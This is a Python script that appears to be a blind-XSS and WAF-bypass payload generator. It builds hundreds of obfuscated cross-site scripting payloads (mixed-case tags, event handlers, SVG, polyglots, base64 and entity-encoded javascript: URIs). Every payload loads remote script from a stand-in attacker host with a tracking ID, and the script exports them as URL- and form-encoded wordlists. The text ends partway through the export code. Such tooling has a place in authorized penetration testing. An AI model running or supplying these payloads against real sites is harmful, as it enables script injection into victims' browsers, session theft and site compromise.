#!/usr/bin/env python3
"""
ULTIMATE XSS WAF BYPASS PAYLOAD GENERATOR
Author: S.Lor
Description: Generate comprehensive XSS payloads with tracking IDs for blind XSS testing
"""

import base64
import random
import os
from urllib.parse import quote

class UltimateXSSGenerator:
    def __init__(self, attacker_server="https://attacker.com", payload_file="/x.js", output_dir="./wordlists"):
        self.attacker_server = attacker_server
        self.payload_file = payload_file
        self.output_dir = output_dir
        self.all_payloads = []
        
        # Extract domain without protocol for protocol-relative URLs
        if self.attacker_server.startswith('https://'):
            self.domain_no_proto = self.attacker_server[8:]
        elif self.attacker_server.startswith('http://'):
            self.domain_no_proto = self.attacker_server[7:]
        else:
            self.domain_no_proto = self.attacker_server
    
    def _get_obfuscated_variants(self, keyword):
        """Generate obfuscation variants for keywords like atob, eval, btoa"""
        variants = []
        
        if keyword == 'atob':
            variants = [
                'atob',                          # normal
                "window['atob']",                # bracket notation
                "self['atob']",                  # self reference
                "top['atob']",                   # top reference
                "['ato'+'b']",                   # concatenation in bracket
                "window['ato'+'b']",             # window + concat
            ]
        elif keyword == 'eval':
            variants = [
                'eval',
                "window['eval']",
                "self['eval']",
                "top['eval']",
                "Function",                      # alternative to eval
                "window['Function']",
            ]
        elif keyword == 'btoa':
            variants = [
                'btoa',
                "window['btoa']",
                "self['btoa']",
            ]
        
        return variants
        
    def generate_all_payloads(self):
        """Generate all payload categories"""
        print("[+] Generating XSS Payloads - THE BEST OF THE BEST Edition...")
        
        # Core payloads
        print("  [*] Basic payloads...")
        self._generate_basic()
        
        print("  [*] Base64 payloads with obfuscation...")
        self._generate_base64()
        
        print("  [*] Obfuscated payloads...")
        self._generate_obfuscated()
        
        # TIER 1: Critical auto-trigger vectors
        print("  [*] Event handlers (auto-trigger)...")
        self._generate_event_handlers()
        
        print("  [*] SVG advanced vectors...")
        self._generate_svg_advanced()
        
        print("  [*] Meta & Link tags...")
        self._generate_meta_link()
        
        # TIER 2: Essential bypasses
        print("  [*] Polyglot payloads...")
        self._generate_polyglot()
        
        print("  [*] Quote variations...")
        self._generate_quote_variations()
        
        print("  [*] Form vectors...")
        self._generate_form_vectors()
        
        # TIER 3: Advanced techniques
        print("  [*] Modern JavaScript...")
        self._generate_modern_js()
        
        print("  [*] Advanced bypass tricks...")
        self._generate_advanced_bypass()
        
        print("  [*] JavaScript protocol obfuscation...")
        self._generate_javascript_protocol_obfuscation()
        
        print(f"[+] Generated {len(self.all_payloads)} base payloads")
        return self.all_payloads
    
    def _add_payload(self, payload):
        """Add payload to list"""
        self.all_payloads.append(payload)
    
    # ============================================================================
    # PAYLOAD GENERATORS
    # ============================================================================
    
    def _generate_basic(self):
        """Basic payloads with consistent mixed-case obfuscation"""
        # Using {URL} placeholder that will be replaced during export
        payloads = [
            # Script tags with src
            '<sCrIpT sRc="{URL}"></sCrIpT>',
            '<sCrIpT sRc={URL}></sCrIpT>',
            f'<sCrIpT sRc=//{self.domain_no_proto}{{FILE}}></sCrIpT>',
            
            # IMG with onerror
            '<iMg sRc=x oNeRRoR="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)">',
            
            # SVG
            '<sVg oNLoAd="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)">',
            
            # IFRAME
            '<iFrAmE sRc="{URL}"></iFrAmE>',
            
            # Object
            '<oBjEcT dAtA="{URL}"></oBjEcT>',
            
            # Embed
            '<eMbEd sRc="{URL}">',
            
            # Video/Audio
            '<vIdEo sRc=x oNeRRoR="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)">',
            '<aUdIo sRc=x oNeRRoR="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)">',
            
            # Form/Input
            '<iNpUt oNfOcUs="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)" autofocus>',
            '<sElEcT oNfOcUs="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)" autofocus>',
            
            # Details/Marquee
            '<dEtAiLs oNToGgLe="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)" open>',
            '<mArQuEe oNsTaRt="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)">',
            
            # Body
            '<bOdY oNLoAd="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)">',
            
            # JavaScript protocol
            '<a hReF="javascript:var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)">click</a>',
            '<iFrAmE sRc="javascript:var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)"></iFrAmE>',
        ]
        
        for p in payloads:
            self._add_payload(p)
    
    def _generate_base64(self):
        """Base64 payloads with obfuscated keywords outside base64"""
        # Base64 content will be generated per-payload during export  
        # Store template with {B64} placeholder
        
        # Get obfuscation variants
        atob_variants = self._get_obfuscated_variants('atob')
        eval_variants = self._get_obfuscated_variants('eval')
        
        payloads = []
        
        # IMG with base64 - combine atob and eval variants (with mixed case tags)
        for atob_v in atob_variants:
            for eval_v in eval_variants[:3]:  # Limit combinations
                if 'window' in atob_v or 'self' in atob_v or 'top' in atob_v:
                    # For bracket notation
                    payloads.append(f'<iMg sRc=x oNeRRoR="{eval_v}({atob_v}(\'{{B64}}\'))">')
                elif 'ato\'+\'b' in atob_v:
                    # For concatenation
                    payloads.append(f'<iMg sRc=x oNeRRoR="{eval_v}(window{atob_v}(\'{{B64}}\'))">')
                else:
                    payloads.append(f'<iMg sRc=x oNeRRoR="{eval_v}({atob_v}(\'{{B64}}\'))">')
        
        # SVG with base64
        for atob_v in atob_variants[:4]:  # Limit variants
            for eval_v in eval_variants[:2]:
                if 'window' in atob_v or 'self' in atob_v or 'top' in atob_v:
                    payloads.append(f'<sVg oNLoAd="{eval_v}({atob_v}(\'{{B64}}\'))">')
                elif 'ato\'+\'b' in atob_v:
                    payloads.append(f'<sVg oNLoAd="{eval_v}(window{atob_v}(\'{{B64}}\'))">')
                else:
                    payloads.append(f'<sVg oNLoAd="{eval_v}({atob_v}(\'{{B64}}\'))">')
        
        # Script data URL with base64 (mixed case)
        payloads.append('<sCrIpT sRc="data:text/javascript;base64,{B64}"></sCrIpT>')
        payloads.append('<sCrIpT sRc="data:;base64,{B64}"></sCrIpT>')
        
        # Object with base64 HTML (mixed case)
        payloads.append('<oBjEcT dAtA="data:text/html;base64,{B64_HTML}"></oBjEcT>')
        
        for p in payloads:
            self._add_payload(p)
    
    def _generate_obfuscated(self):
        """Non-base64 with heavy obfuscation (all with mixed-case tags)"""
        payloads = [
            # HTML entities (mixed case tags)
            '<&#x73;CrIpT sRc="{URL}"></&#x73;CrIpT>',
            '<&#115;CrIpT sRc="{URL}"></&#115;CrIpT>',
            
            # Whitespace variations (mixed case)
            '<sCrIpT/sRc="{URL}"></sCrIpT>',
            '<sCrIpT\nsRc="{URL}"></sCrIpT>',
            '<sCrIpT\tsRc="{URL}"></sCrIpT>',
            
            # Null byte injection (mixed case)
            '<sCrIpT sRc="{URL}%00"></sCrIpT>',
            '<sCr%00IpT sRc="{URL}"></sCr%00IpT>',
            
            # String concatenation in event handlers (mixed case)
            '<iMg sRc=x oNeRRoR="var s=document.createElement(\'scr\'+\'ipt\');s.src=\'{URL}\';document.head.appendChild(s)">',
            '<iMg sRc=x oNeRRoR="var s=document[\'create\'+\'Element\'](\'script\');s.src=\'{URL}\';document.head.appendChild(s)">',
            
            # Bracket notation (mixed case)
            '<iMg sRc=x oNeRRoR="window[\'eval\'](\'var s=document.createElement(\\\'script\\\');s.src=\\\'{URL}\\\';document.head.appendChild(s)\')">', 
            
            # Alternative tags with mixed case and slash
            '<sVg/oNLoAd="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)">', 
            '<dEtAiLs/oNToGgLe="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)" open>',
            '<mArQuEe/oNsTaRt="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)">',
            
            # Template strings (mixed case)
            '<iMg sRc=x oNeRRoR="eval(`var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)`)">', 
            
            # setTimeout/setInterval (mixed case)
            '<iMg sRc=x oNeRRoR="setTimeout(\'var s=document.createElement(\\\'script\\\');s.src=\\\'{URL}\\\';document.head.appendChild(s)\',100)">',
            
            # Unicode escape in strings (mixed case)
            '<iMg sRc=x oNeRRoR="eval(\'var s=document.createElement(\\u0027script\\u0027);s.src=\\\'{URL}\\\';document.head.appendChild(s)\')">', 
        ]
        
        for p in payloads:
            self._add_payload(p)
    
    # ============================================================================
    # TIER 1: AUTO-TRIGGER VECTORS (Critical for Blind XSS)
    # ============================================================================
    
    def _generate_event_handlers(self):
        """Auto-trigger event handlers - critical for blind XSS detection"""
        payloads = [
            # Mouse events (auto-trigger on hover)
            '<dIv oNmOuSeOvEr="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)">hover</dIv>',
            '<dIv oNmOuSeEnTeR="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)">hover</dIv>',
            '<sPaN oNmOuSeOvEr="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)">hover</sPaN>',
            '<tAbLe oNmOuSeOvEr="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)"><tr><td>x</td></tr></tAbLe>',
            
            # Click events
            '<dIv oNcLiCk="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)">click</dIv>',
            '<bUtToN oNcLiCk="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)">click</bUtToN>',
            
            # Pointer events (modern, touch + mouse)
            '<dIv oNpOiNtErOvEr="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)">hover</dIv>',
            '<dIv oNpOiNtErEnTeR="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)">hover</dIv>',
            
            # Keyboard events
            '<iNpUt oNkEyDoWn="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)" autofocus>',
            '<iNpUt oNkEyUp="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)" autofocus>',
            '<iNpUt oNkEyPrEsS="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)" autofocus>',
            
            # Input events (fires on every character)
            '<iNpUt oNiNpUt="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)" autofocus value="x">',
            '<tExTaReA oNiNpUt="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)" autofocus>x</tExTaReA>',
            
            # Change/blur events
            '<iNpUt oNcHaNgE="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)">',
            '<iNpUt oNbLuR="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)" autofocus>',
            
            # Animation events (CSS-based auto-trigger!) - VERY POWERFUL
            '<dIv oNaNiMaTiOnStArT="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)" style="animation:x 1s">x</dIv>',
            '<dIv oNaNiMaTiOnEnD="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)" style="animation:x 1s">x</dIv>',
            '<dIv oNaNiMaTiOnItErAtIoN="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)" style="animation:x 1s">x</dIv>',
            
            # Transition events (CSS auto-trigger)
            '<dIv oNtRaNsItIoNeNd="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)" style="transition:1s">x</dIv>',
            
            # Clipboard events
            '<iNpUt oNcUt="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)" value="cut me">',
            '<iNpUt oNcOpY="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)" value="copy me">',
            '<iNpUt oNpAsTe="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)">',
            
            # Context menu
            '<dIv oNcOnTeXtMeNu="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)">right-click</dIv>',
            
            # Drag events
            '<dIv dRaGgAbLe=true oNdRaG="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)">drag</dIv>',
            '<dIv dRaGgAbLe=true oNdRaGsTaRt="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)">drag</dIv>',
            
            # Wheel/scroll events
            '<dIv oNwHeEl="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)">scroll</dIv>',
            '<dIv oNsCrOlL="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)" style="overflow:auto;height:50px">scroll<br><br><br></dIv>',
            
            # Form submit
            '<fOrM oNsUbMiT="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)"><input type=submit></fOrM>',
            
            # Reset event
            '<fOrM oNrEsEt="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)"><input type=reset></fOrM>',
        ]
        
        for p in payloads:
            self._add_payload(p)
    
    def _generate_svg_advanced(self):
        """Advanced SVG vectors with auto-trigger"""
        payloads = [
            # SVG animate (auto-trigger) - VERY POWERFUL
            '<sVg><aNiMaTe oNbEgIn="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)" attributeName=x dur=1s>',
            '<sVg><aNiMaTe oNbEgIn="eval(atob(\'{{B64}}\'))" attributeName=x dur=1s>',
            
            # SVG set
            '<sVg><sEt oNbEgIn="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)" attributeName=x to=y>',
            
            # SVG animateTransform
            '<sVg><aNiMaTeTraNsFoRm oNbEgIn="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)" attributeName=transform>',
            
            # SVG with nested script
            '<sVg><sCrIpT hReF="{URL}"></sCrIpT></sVg>',
            '<sVg><sCrIpT xlink:href="{URL}"/></sVg>',
            
            # SVG foreignObject (nest HTML)
            '<sVg><fOrEiGnObJeCt><bOdY oNLoAd="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)"></bOdY></fOrEiGnObJeCt></sVg>',
            '<sVg><fOrEiGnObJeCt><iMg sRc=x oNeRRoR="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)"></fOrEiGnObJeCt></sVg>',
            
            # SVG use (external reference)
            '<sVg><uSe xlink:href="{URL}#xss"/></sVg>',
            
            # SVG image
            '<sVg><iMaGe xlink:href="{URL}"/></sVg>',
            '<sVg><iMaGe href="{URL}" oNeRRoR="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)"/></sVg>',
        ]
        
        for p in payloads:
            self._add_payload(p)
    
    def _generate_meta_link(self):
        """Meta and Link tags - auto-trigger"""
        payloads = [
            # Meta refresh (auto-trigger)
            '<mEtA http-equiv="refresh" content="0;url=javascript:var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)">',
            '<mEtA http-equiv="refresh" content="0;url={URL}">',
            '<mEtA http-equiv="refresh" content="0;{URL}">',
            
            # Link prefetch (triggers request)
            '<lInK rel="prefetch" hReF="{URL}">',
            '<lInK rel="preload" hReF="{URL}" as="script">',
            '<lInK rel="dns-prefetch" hReF="//{URL}">',
            
            # Link import (auto-loads)
            '<lInK rel="import" hReF="{URL}">',
            
            # Link stylesheet with onerror
            '<lInK rel="stylesheet" hReF="x" oNeRRoR="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)">',
        ]
        
        for p in payloads:
            self._add_payload(p)
    
    def _generate_polyglot(self):
        """Polyglot payloads for unknown contexts"""
        payloads = [
            # JavaScript + HTML polyglot
            'javascript:/*--></tItLe></sTyLe></sCrIpT><sCrIpT sRc={URL}>//',
            'javascript:/*</sCrIpT><sCrIpT sRc={URL}>//*/',
            
            # JSON polyglot
            '{"x":"<!--","y":"--><sCrIpT sRc={URL}></sCrIpT><!--"}',
            '{"onerror":"var s=document.createElement(\'script\');s.src=\'{URL}\'","x":"<iMg sRc=x oNeRRoR=onerror>"}',
            
            # XML/CDATA
            '<![CDATA[]]><sCrIpT sRc={URL}></sCrIpT>',
            ']]><sCrIpT sRc={URL}></sCrIpT><![CDATA[',
            
            # Multi-context
            '"\';}</sCrIpT><sCrIpT sRc={URL}></sCrIpT>//',
            '\';alert(1)//\';alert(1)//";alert(1)//";alert(1)//--></sCrIpT>">\'>',
        ]
        
        for p in payloads:
            self._add_payload(p)
    
    def _generate_quote_variations(self):
        """Quote variations for attribute bypass"""
        payloads = [
            # No quotes in event handler (bypass quote filters)
            '<iMg sRc=x oNeRRoR=eval(atob({{B64}}))>',
            '<iMg sRc=x oNeRRoR=alert(1)>',
            
            # Backticks (template literals)
            '<iMg sRc=x oNeRRoR=`var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)`>',
            
            # Mixed quotes in attributes
            '<iMg sRc=\'x\' oNeRRoR="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)">',
            '<iMg sRc="x" oNeRRoR=\'var s=document.createElement("script");s.src="{URL}";document.head.appendChild(s)\'>',
            
            # No quotes in src
            '<sCrIpT sRc={URL}></sCrIpT>',
            '<iFrAmE sRc={URL}></iFrAmE>',
            '<oBjEcT dAtA={URL}></oBjEcT>',
            
            # Backticks in src (rare but valid)
            '<sCrIpT sRc=`{URL}`></sCrIpT>',
            
            # Grave accent
            '<iMg sRc=`x` oNeRRoR=`var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)`>',
        ]
        
        for p in payloads:
            self._add_payload(p)
    
    def _generate_form_vectors(self):
        """Form-based vectors"""
        payloads = [
            # Form action
            '<fOrM aCtIoN="javascript:var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)"><input type=submit></fOrM>',
            '<fOrM aCtIoN="{URL}"><input name=x></fOrM>',
            
            # Button formaction
            '<fOrM><bUtToN fOrMaCtIoN="javascript:var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)">click</bUtToN></fOrM>',
            '<fOrM><bUtToN fOrMaCtIoN="{URL}">click</bUtToN></fOrM>',
            
            # Input formaction
            '<fOrM><iNpUt type=submit fOrMaCtIoN="javascript:var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)"></fOrM>',
            
            # Isindex (legacy but still works)
            '<iSiNdEx aCtIoN="javascript:var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)">',
        ]
        
        for p in payloads:
            self._add_payload(p)
    
    def _generate_modern_js(self):
        """Modern JavaScript features"""
        payloads = [
            # Dynamic import
            '<sCrIpT>import(\'{URL}\')</sCrIpT>',
            '<iMg sRc=x oNeRRoR="import(\'{URL}\')">',
            '<iMg sRc=x oNeRRoR="import(\'{URL}\').then(m=>m.default())">',
            
            # Fetch API
            '<iMg sRc=x oNeRRoR="fetch(\'{URL}\').then(r=>r.text()).then(eval)">',
            '<iMg sRc=x oNeRRoR="fetch(\'{URL}\').then(r=>eval(r.text()))">',
            
            # Async/await
            '<iMg sRc=x oNeRRoR="(async()=>{{let r=await fetch(\'{URL}\');eval(await r.text())}})()">',
            
            # Constructor variations
            '<iMg sRc=x oNeRRoR="(new Function(\'var s=document.createElement(\\\'script\\\');s.src=\\\'{URL}\\\';\'))()">',
            '<iMg sRc=x oNeRRoR="([\'constructor\'].map(x=>window[x][x](\'var s=document.createElement(\\\'script\\\');s.src=\\\'{URL}\\\'\')[0]))()">',
            
            # GeneratorFunction
            '<iMg sRc=x oNeRRoR="(function*(){{yield var s=document.createElement(\'script\');s.src=\'{URL}\';}})().next()">',
        ]
        
        for p in payloads:
            self._add_payload(p)
    
    def _generate_advanced_bypass(self):
        """Advanced bypass techniques"""
        payloads = [
            # Comment inside tag name
            '<sCr<!---->IpT sRc="{URL}"></sCrIpT>',
            '<i<!---->Mg sRc=x oNeRRoR="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)">',
            '<sV<!---->g oNLoAd="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)">',
            
            # Orphan/unclosed tags
            '<sCrIpT sRc="{URL}">',
            '<iMg sRc=x oNeRRoR="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)"',
            
            # Multiple spaces/tabs
            '<sCrIpT     sRc    =    "{URL}"></sCrIpT>',
            '<iMg    sRc=x    oNeRRoR="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)">',
            
            # Newlines in attributes
            '<sCrIpT\nsRc\n=\n"{URL}"></sCrIpT>',
            
            # Carriage return
            '<sCrIpT\rsRc="{URL}"></sCrIpT>',
            
            # Form feed
            '<sCrIpT\fsRc="{URL}"></sCrIpT>',
            
            # Null byte in attribute
            '<sCrIpT sRc="{URL}"\x00></sCrIpT>',
            
            # Malformed quotes
            '<iMg sRc=""x oNeRRoR="var s=document.createElement(\'script\');s.src=\'{URL}\';document.head.appendChild(s)">',
            
            # Nested encoding
            '<iMg sRc=x oNeRRoR="eval(unescape(\'%76%61%72%20%73%3d%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%73%63%72%69%70%74%27%29\'))">',
            
            # Using with (deprecated but works)
            '<iMg sRc=x oNeRRoR="with(document){{var s=createElement(\'script\');s.src=\'{URL}\';head.appendChild(s)}}">',
            
            # Overlong UTF-8 (bypass some filters)
            '<sCrIpT sRc="{URL}"></sCrIpT>',
        ]
        
        for p in payloads:
            self._add_payload(p)
    
    def _generate_javascript_protocol_obfuscation(self):
        """JavaScript protocol obfuscation using HTML entities (TAB injection)"""
        # Payloads to execute
        js_payloads = [
            "var s=document.createElement('script');s.src='{URL}';document.head.appendChild(s)",
            "document.body.appendChild(document.createElement('script')).src='{URL}'",
            "fetch('{URL}').then(r=>r.text()).then(eval)",
            "var x=new XMLHttpRequest();x.open('GET','{URL}');x.onload=()=>eval(x.responseText);x.send()",
            "import('{URL}')",
        ]
        
        payloads = []
        
        for js_code in js_payloads:
            # Method 1: Decimal entity (&#9;) - TAB character
            obf_js_decimal = "j&#9;a&#9;v&#9;a&#9;s&#9;c&#9;r&#9;i&#9;p&#9;t:"
            payloads.append(f'<a hReF="{obf_js_decimal}{js_code}">XSS</a>')
            payloads.append(f'<iFrAmE sRc="{obf_js_decimal}{js_code}"></iFrAmE>')
            
            # Method 2: Hex entity (&#x09;) - TAB character
            obf_js_hex = "j&#x09;a&#x09;v&#x09;a&#x09;s&#x09;c&#x09;r&#x09;i&#x09;p&#x09;t:"
            payloads.append(f'<a hReF="{obf_js_hex}{js_code}">XSS</a>')
            payloads.append(f'<iFrAmE sRc="{obf_js_hex}{js_code}"></iFrAmE>')
            
            # Method 3: Named entity (&Tab;) - TAB character
            obf_js_named = "j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t:"
            payloads.append(f'<a hReF="{obf_js_named}{js_code}">XSS</a>')
            payloads.append(f'<iFrAmE sRc="{obf_js_named}{js_code}"></iFrAmE>')
            payloads.append(f'<bUtToN fOrMaCtIoN="{obf_js_named}{js_code}">XSS</bUtToN>')
            
            # Method 4: Newline entity (&#10;) - Newline character
            obf_js_newline = "j&#10;a&#10;v&#10;a&#10;s&#10;c&#10;r&#10;i&#10;p&#10;t:"
            payloads.append(f'<a hReF="{obf_js_newline}{js_code}">XSS</a>')
            
            # Method 5: Mixed entities (harder to detect)
            obf_js_mixed = "j&#9;a&#x09;v&Tab;a&#9;s&#x09;c&Tab;r&#9;i&#x09;p&Tab;t:"
            payloads.append(f'<a hReF="{obf_js_mixed}{js_code}">XSS</a>')
        
        # Additional obfuscation: Base64 version with obfuscated javascript:
        # These combine entity obfuscation with base64
        atob_payloads = [
            "eval(atob('{B64}'))",
            "eval(window['atob']('{B64}'))",
            "Function(atob('{B64}'))()",
        ]
        
        for atob_code in atob_payloads:
            obf_js_decimal = "j&#9;a&#9;v&#9;a&#9;s&#9;c&#9;r&#9;i&#9;p&#9;t:"
            payloads.append(f'<a hReF="{obf_js_decimal}{atob_code}">XSS</a>')
            
            obf_js_hex = "j&#x09;a&#x09;v&#x09;a&#x09;s&#x09;c&#x09;r&#x09;i&#x09;p&#x09;t:"
            payloads.append(f'<a hReF="{obf_js_hex}{atob_code}">XSS</a>')
            
            obf_js_named = "j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t:"
            payloads.append(f'<a hReF="{obf_js_named}{atob_code}">XSS</a>')
        
        for p in payloads:
            self._add_payload(p)
    
    # ============================================================================
    # EXPORT FUNCTIONS
    # ============================================================================
    
    def _add_tracking_id(self, payload, payload_id):
        """Replace placeholders with actual tracked URLs"""
        result = payload
        
        # Replace {URL} placeholder
        tracked_url = f"{self.attacker_server}{self.payload_file}?id={payload_id}"
        result = result.replace('{URL}', tracked_url)
        
        # Replace {FILE} placeholder (protocol-relative)
        tracked_file = f"{self.payload_file}?id={payload_id}"
        result = result.replace('{FILE}', tracked_file)
        
        # Replace {B64} placeholder (base64 encoded loader)
        if '{B64}' in result:
            loader_script = f"var s=document.createElement('script');s.src='{tracked_url}';document.head.appendChild(s)"
            loader_b64 = base64.b64encode(loader_script.encode()).decode()
            result = result.replace('{B64}', loader_b64)
        
        # Replace {B64_HTML} placeholder (base64 encoded HTML)
        if '{B64_HTML}' in result:
            html_content = f'<script src="{tracked_url}"></script>'
            html_b64 = base64.b64encode(html_content.encode()).decode()
            result = result.replace('{B64_HTML}', html_b64)
        
        return result
    
    def export_wordlists(self):
        """Export payloads to wordlist files"""
        os.makedirs(self.output_dir, exist_ok=True)
        
        # Prefix: Universal escape combo - breaks out of multiple contexts
        # Order: close strings first, then comments, then tags (all with mixed case)
        escape_prefix = '\'";`--></sCrIpT></sTyLe></tExTaReA></tItLe></tEmPlAtE></nOsCrIpT></nOeMbEd>'
        
        # Suffix variants: Comment out remaining code after payload
        suffix_variants = [
            ('<!--', 'HTML comment'),
            ('//', 'JS comment'),
            ('<!--//', 'HTML+JS combo')
        ]
        
        total_payloads = len(self.all_payloads)
        total_with_escapes = total_payloads * (1 + len(suffix_variants))  # base + 3 escaped variants
        
        # 1. Form-urlencoded payloads (raw format for POST forms)
        with open(f'{self.output_dir}/www_input_payloads.txt', 'w', encoding='utf-8') as f:
            f.write("# XSS PAYLOAD WORDLIST - FORM-URLENCODED FORMAT\n")
            f.write("# " + "="*70 + "\n")
            f.write(f"# Use for: POST/PUT/PATCH with application/x-www-form-urlencoded\n")
            f.write(f"# Total Payloads: {total_with_escapes}\n")
            f.write(f"# Server: {self.attacker_server}{self.payload_file}\n")
            f.write(f"# Note: Browser will auto URL-encode on form submit\n")
            f.write("# " + "="*70 + "\n\n")
            
            # Section 1: No Escape
            f.write("# " + "="*70 + "\n")
            f.write("# SECTION 1: NO ESCAPE PAYLOADS\n")
            f.write(f"# Total: {total_payloads} payloads\n")
            f.write("# " + "="*70 + "\n\n")
            
            payload_id = 1
            for payload in self.all_payloads:
                # Add tracking ID to URL in payload
                tracked = self._add_tracking_id(payload, payload_id)
                f.write(f"{tracked}\n")
                payload_id += 1
            
            # Sections 2-4: With Prefix + Different Suffixes
            section_num = 2
            for suffix, suffix_desc in suffix_variants:
                f.write("\n# " + "="*70 + "\n")
                f.write(f"# SECTION {section_num}: PREFIX + {suffix_desc.upper()} SUFFIX\n")
                f.write(f"# Prefix: {escape_prefix}\n")
                f.write(f"# Suffix: {suffix}\n")
                f.write(f"# Total: {total_payloads} payloads\n")
                f.write("# " + "="*70 + "\n\n")
                
                for payload in self.all_payloads:
                    # Add tracking ID to URL in payload
                    tracked = self._add_tracking_id(payload, payload_id)
                    escaped_payload = f"{escape_prefix}{tracked}{suffix}"
                    f.write(f"{escaped_payload}\n")
                    payload_id += 1
                
                section_num += 1
        
        # 2. URL payloads (fully encoded for GET requests)
        with open(f'{self.output_dir}/url_payloads.txt', 'w', encoding='utf-8') as f:
            f.write("# XSS PAYLOAD WORDLIST - URL ENCODED\n")
            f.write("# " + "="*70 + "\n")
            f.write(f"# Use for: GET requests (URL parameters)\n")
            f.write(f"# Total Payloads: {total_with_escapes}\n")
            f.write(f"# Server: {self.attacker_server}{self.payload_file}\n")
            f.write(f"# Note: Already URL-encoded, use directly in URLs\n")
            f.write("# " + "="*70 + "\n\n")
            
            # Section 1: No Escape
            f.write("# " + "="*70 + "\n")
            f.write("# SECTION 1: NO ESCAPE PAYLOADS\n")
            f.write(f"# Total: {total_payloads} payloads\n")
            f.write("# " + "="*70 + "\n\n")
            
            payload_id = 1
            for payload in self.all_payloads:
                # Add tracking ID to URL in payload
                tracked = self._add_tracking_id(payload, payload_id)
                encoded = quote(tracked, safe='')
                f.write(f"{encoded}\n")
                payload_id += 1
            
            # Sections 2-4: With Prefix + Different Suffixes
            section_num = 2
            for suffix, suffix_desc in suffix_variants:
                f.write("\n# " + "="*70 + "\n")
                f.write(f"# SECTION {section_num}: PREFIX + {suffix_desc.upper()} SUFFIX\n")
                f.write(f"# Prefix: {escape_prefix}\n")
                f.write(f"# Suffix: {suffix}\n")
                f.write(f"# Total: {total_payloads} payloads\n")
                f.write("# " + "="*70 + "\n\n")
                
                for payload in self.all_payloads:
                    # Add tracking ID to URL in payload
                    tracked = self._add_tracking_id(payload, payload_id)
                    escaped_payload = f"{escape_prefix}{tracked}{suffix}"
                    encoded = quote(escaped_payload, safe='')
                    f.write(f"{encoded}\n")
                    payload_id += 1
                
                section_num += 1
        
        # 3. JSON payloads (JSON-escaped for POST JSON requests)
